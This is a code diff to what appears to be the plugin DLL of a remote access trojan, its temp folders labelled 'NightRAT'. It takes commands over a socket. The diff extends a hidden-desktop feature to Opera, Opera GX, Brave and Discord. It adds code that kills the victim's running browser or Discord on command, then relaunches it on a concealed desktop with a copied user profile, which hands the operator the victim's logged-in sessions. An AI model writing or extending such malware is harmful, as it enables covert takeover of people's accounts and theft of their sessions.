@@ -24,6 +24,7 @@
 #include <iostream>
 #include <filesystem>
 #include <chrono>
+#include <tlhelp32.h>
 #include "../../include/json.hpp"
 
 #pragma comment(lib, "ws2_32.lib")
@@ -573,6 +574,27 @@ static bool compress_buffer(const std::vector<unsigned char>& input, std::vector
         return true;
     }
     return false;
+}
+
+static void kill_process_by_name(const wstring& exeName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+
+    PROCESSENTRY32W pe32{};
+    pe32.dwSize = sizeof(pe32);
+
+    if (Process32FirstW(hSnap, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, exeName.c_str()) == 0) {
+                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
+                if (hProc) {
+                    TerminateProcess(hProc, 0);
+                    CloseHandle(hProc);
+                }
+            }
+        } while (Process32NextW(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
 }
 
 // -----------------------------------------------------------------------
@@ -1578,17 +1600,26 @@ static wstring get_app_path(const wstring& appName) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
-    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
-
-    wstring path = szPath;
-    if (browserName == L"Google Chrome") {
-        path += L"\\Google\\Chrome\\User Data";
-    } else if (browserName == L"Microsoft Edge") {
-        path += L"\\Microsoft\\Edge\\User Data";
+    if (browserName == L"Opera" || browserName == L"Opera GX") {
+        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        wstring path = szPath;
+        if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
+        else path += L"\\Opera Software\\Opera GX Stable";
+        return path;
     } else {
-        return L"";
+        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        wstring path = szPath;
+        if (browserName == L"Google Chrome") {
+            path += L"\\Google\\Chrome\\User Data";
+        } else if (browserName == L"Microsoft Edge") {
+            path += L"\\Microsoft\\Edge\\User Data";
+        } else if (browserName == L"Brave") {
+            path += L"\\BraveSoftware\\Brave-Browser\\User Data";
+        } else {
+            return L"";
+        }
+        return path;
     }
-    return path;
 }
 
 static wstring get_gecko_profile_path(const wstring& browserName) {
@@ -1773,19 +1804,24 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             string requestedPath = cmd.value("path", "cmd.exe");
             wstring wRequestedPath = utf8_to_wstring(requestedPath);
             bool copyProfile = cmd.value("copy_profile", false);
+            bool closeReal = cmd.value("close_real", false);
 
             bool isBrowser = (wRequestedPath == L"Google Chrome" ||
                               wRequestedPath == L"Microsoft Edge" ||
                               wRequestedPath == L"Firefox" ||
                               wRequestedPath == L"Waterfox" ||
-                              wRequestedPath == L"LibreWolf");
+                              wRequestedPath == L"LibreWolf" ||
+                              wRequestedPath == L"Opera" ||
+                              wRequestedPath == L"Opera GX" ||
+                              wRequestedPath == L"Brave" ||
+                              wRequestedPath == L"Discord");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
                             wRequestedPath == L"LibreWolf");
 
             if (isBrowser) {
-                thread([wRequestedPath, copyProfile, isGecko]() {
+                thread([wRequestedPath, copyProfile, isGecko, closeReal]() {
                     ensure_desktop();
                     if (!g_hHiddenDesktop) return;
 
@@ -1795,21 +1831,72 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Firefox") exeName = L"firefox.exe";
                     else if (wRequestedPath == L"Waterfox") exeName = L"waterfox.exe";
                     else if (wRequestedPath == L"LibreWolf") exeName = L"librewolf.exe";
+                    else if (wRequestedPath == L"Opera") exeName = L"opera.exe";
+                    else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
+                    else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
+                    else if (wRequestedPath == L"Discord") exeName = L"discord.exe";
 
-                    wstring exePath = get_app_path(exeName);
-                    if (exePath.empty()) {
-                        if (wRequestedPath == L"Firefox") {
-                            exePath = L"C:\\Program Files\\Mozilla Firefox\\firefox.exe";
-                            if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe";
-                        } else if (wRequestedPath == L"Waterfox") {
-                            exePath = L"C:\\Program Files\\Waterfox\\waterfox.exe";
-                        } else if (wRequestedPath == L"LibreWolf") {
-                            exePath = L"C:\\Program Files\\LibreWolf\\librewolf.exe";
+                    if (closeReal && !exeName.empty()) {
+                        send_status("Mevcut uygulama kapatılıyor...");
+                        kill_process_by_name(exeName);
+                        if (wRequestedPath == L"Discord") {
+                            kill_process_by_name(L"Update.exe");
+                        }
+                        Sleep(800);
+                    }
+
+                    wstring exePath;
+                    if (wRequestedPath == L"Discord") {
+                        wchar_t localApp[MAX_PATH];
+                        SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                        wstring updatePath = wstring(localApp) + L"\\Discord\\Update.exe";
+                        if (fs::exists(updatePath)) {
+                            exePath = updatePath;
+                        } else {
+                            fs::path discDir(wstring(localApp) + L"\\Discord");
+                            if (fs::exists(discDir)) {
+                                for (const auto& entry : fs::directory_iterator(discDir)) {
+                                    if (entry.is_directory() && entry.path().filename().wstring().rfind(L"app-", 0) == 0) {
+                                        wstring candidate = entry.path().wstring() + L"\\Discord.exe";
+                                        if (fs::exists(candidate)) {
+                                            exePath = candidate;
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    } else {
+                        exePath = get_app_path(exeName);
+                        if (exePath.empty()) {
+                            if (wRequestedPath == L"Firefox") {
+                                exePath = L"C:\\Program Files\\Mozilla Firefox\\firefox.exe";
+                                if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe";
+                            } else if (wRequestedPath == L"Waterfox") {
+                                exePath = L"C:\\Program Files\\Waterfox\\waterfox.exe";
+                            } else if (wRequestedPath == L"LibreWolf") {
+                                exePath = L"C:\\Program Files\\LibreWolf\\librewolf.exe";
+                            } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
+                                wchar_t localApp[MAX_PATH];
+                                SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
+                                exePath = wstring(localApp) + L"\\Programs\\Opera\\launcher.exe";
+                                if (!fs::exists(exePath)) {
+                                    exePath = wstring(localApp) + L"\\Programs\\Opera GX\\launcher.exe";
+                                }
+                                if (!fs::exists(exePath)) {
+                                    exePath = L"C:\\Program Files\\Opera\\launcher.exe";
+                                }
+                                if (!fs::exists(exePath)) {
+                                    exePath = L"C:\\Program Files\\Opera GX\\launcher.exe";
+                                }
+                            } else if (wRequestedPath == L"Brave") {
+                                exePath = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+                            }
                         }
                     }
 
                     if (exePath.empty() || !fs::exists(exePath)) {
-                        send_error("Browser executable not found.");
+                        send_error("Application executable not found.");
                         return;
                     }
 
@@ -1833,7 +1920,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
                         tempProfileRoot += L"NightRAT_";
-                        tempProfileRoot += exeName;
+                        if (wRequestedPath == L"Opera GX") {
+                            tempProfileRoot += L"operagx";
+                        } else {
+                            tempProfileRoot += exeName;
+                        }
                         tempProfileRoot += L"_Profile";
 
                         // Mevcut kopya varsa temizle
